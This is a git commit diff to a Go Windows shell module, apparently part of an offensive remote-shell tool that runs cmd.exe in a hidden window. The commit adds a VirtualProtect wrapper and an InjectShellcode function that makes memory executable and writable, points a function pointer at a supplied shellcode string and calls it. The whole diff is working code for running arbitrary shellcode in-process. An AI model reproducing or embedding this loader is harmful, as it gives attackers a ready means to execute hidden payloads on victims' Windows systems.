16be89ddad7d20d45fcadb487e457c65351fa022
Ronan Kervella <r.kervella@protonmail.com>
2017-11-02 11:46:39 +0100

    Preparing InjectShellcode

--- shell/shell_windows.go
+++ shell/shell_windows.go
@@ -5,10 +5,43 @@ package shell
 import (
 	"os/exec"
 	"syscall"
+	"unsafe"
 )
+
+var procVirtualProtect = syscall.NewLazyDLL("kernel32.dll").NewProc("VirtualProtect")
+
+func VirtualProtect(lpAddress unsafe.Pointer, dwSize uintptr, flNewProtect uint32, lpflOldProtect unsafe.Pointer) bool {
+	ret, _, _ := procVirtualProtect.Call(
+		uintptr(lpAddress),
+		uintptr(dwSize),
+		uintptr(flNewProtect),
+		uintptr(lpflOldProtect))
+	return ret > 0
+}
 
 func GetShell() *exec.Cmd {
 	cmd := exec.Command("C:\\Windows\\System32\\cmd.exe")
 	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
 	return cmd
+}
+
+func InjectShellcode(shellcode string) {
+	// Declare function pointer
+	f := func() {}
+	// Change permsissions on f function ptr
+	var oldfperms uint32
+	if !VirtualProtect(unsafe.Pointer(*(**uintptr)(unsafe.Pointer(&f))), unsafe.Sizeof(uintptr(0)), uint32(0x40), unsafe.Pointer(&oldfperms)) {
+		panic("Call to VirtualProtect failed!")
+	}
+
+	// Override function ptr
+	**(**uintptr)(unsafe.Pointer(&f)) = *(*uintptr)(unsafe.Pointer(&shellcode))
+
+	// Change permsissions on shellcode string data
+	var oldshellcodeperms uint32
+	if !VirtualProtect(unsafe.Pointer(*(*uintptr)(unsafe.Pointer(&shellcode))), uintptr(len(shellcode)), uint32(0x40), unsafe.Pointer(&oldshellcodeperms)) {
+		panic("Call to VirtualProtect failed!")
+	}
+	// Call the function ptr it
+	f()
 }
